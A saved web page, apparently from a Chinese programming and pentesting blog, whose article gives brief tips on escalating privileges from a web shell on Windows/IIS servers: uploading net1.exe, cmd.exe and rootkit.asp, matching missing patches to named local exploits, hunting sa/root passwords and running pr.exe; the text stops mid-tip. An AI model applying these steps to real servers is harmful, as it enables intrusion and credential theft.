@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>ASP Web提权 | 冰河技术</title>
+    <meta name="generator" content="VuePress 1.9.7">
+    <link rel="icon" href="/favicon.ico">
+    <script charset="utf-8" async="async" src="/js/jquery.min.js"></script>
+    <script charset="utf-8" async="async" src="/js/global.js"></script>
+    <script charset="utf-8" async="async" src="/js/fingerprint2.min.js"></script>
+    <script charset="utf-8" async="async" src="https://v1.cnzz.com/z_stat.php?id=1281063564&amp;web_id=1281063564"></script>
+    <script charset="utf-8" async="async" src="https://s9.cnzz.com/z_stat.php?id=1281064551&amp;web_id=1281064551"></script>
+    <script>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?d091d2fd0231588b1d0f9231e24e3f5e";
+              var s = document.getElementsByTagName("script")[0];
+              s.parentNode.insertBefore(hm, s);
+            })();
+            </script>
+    <meta name="description" content="包含：编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧...">
+    <meta property="article:modified_time" content="2022-05-02T14:13:45.000Z">
+    <meta property="og:title" content="ASP Web提权">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html">
+    <meta name="twitter:title" content="ASP Web提权">
+    <meta name="twitter:url" content="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="all">
+    <meta name="author" content="冰河">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="keywords" content="冰河，冰河技术, 编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    
+    <link rel="preload" href="/assets/css/0.styles.ab888ebb.css" as="style"><link rel="preload" href="/assets/css/styles.css?v=1651501291226" as="style"><link rel="preload" href="/assets/js/cg-styles.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-app.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-4.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-3.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-157.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-5.js?v=1651501291226" as="script"><link rel="preload" href="/assets/js/cg-6.js?v=1651501291226" as="script">
+    <link rel="stylesheet" href="/assets/css/0.styles.ab888ebb.css"><link rel="stylesheet" href="/assets/css/styles.css?v=1651501291226">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">冰河技术</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/2022-05-02-001-3389脚本开启代码(vbs版).html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/2022-05-02-001-3389脚本开启代码(vbs版).html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>数据与系统提权篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/md/hack/raising/2022-05-02-001-数据库提权.html" class="sidebar-link">数据库提权</a></li><li><a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html" class="sidebar-link">NC反弹CMDSHELL提权总结</a></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web提权.html" class="active sidebar-link">ASP Web提权</a></li><li><a href="/md/hack/raising/2022-05-02-004-MSF提权.html" class="sidebar-link">MSF提权</a></li><li><a href="/md/hack/raising/2022-05-02-005-Metasploit-Win10提权.html" class="sidebar-link">Metasploit Win10提权</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="asp-web提权"><a href="#asp-web提权" class="header-anchor">#</a> ASP Web提权</h1> <h2 id="web提权"><a href="#web提权" class="header-anchor">#</a> web提权</h2> <p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行<code>/c c:\windows\temp\cookies\net1.exe user</code></p> <p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p> <p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，<code>cmd.exe/cmd.com/cmd.txt</code> 都可以。</p> <p>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p> <p>6.c:\windows\temp\cookies\  这个目录</p> <p>7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p> <p>8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c 